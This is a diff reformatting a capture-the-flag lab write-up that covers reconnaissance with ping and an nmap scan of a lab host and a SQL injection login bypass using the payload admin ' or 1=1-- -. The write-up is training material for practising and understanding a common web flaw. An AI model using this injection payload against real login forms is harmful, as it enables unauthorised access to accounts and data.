@@ -18,22 +18,27 @@ tags:
 
 
 ![](/img2/Pasted%20image%2020250310105353.png)
+
 ## Introduction
 
 > In this machine, we are exploiting an SQL Injection in the login panel.
 
 ## Reconnaissance
 
-1. Connectivity
+- Connectivity
+
 ```bash
 ping -c1 10.129.242.134
 ```
 
-2. Nmap
+- Nmap
+
 ```bash
 nmap -sS --open -p- --min-rate 5000 -vvv -n -Pn 10.129.242.134
 ```
+
 ![](/img2/Pasted%20image%2020250310105700.png)
+
 ## Exploitation
 
 ![](/img2/Pasted%20image%2020250310105830.png)
@@ -41,10 +46,12 @@ nmap -sS --open -p- --min-rate 5000 -vvv -n -Pn 10.129.242.134
 Password --> admin ' or 1=1-- -
 
 SQL query example:
+
 ```sql
 select flag from users
 where user=='admin' and password=='admin' or 1=1-- -'
 ```
+
 ## Tasks
 
 1. What does the acronym SQL stand for?
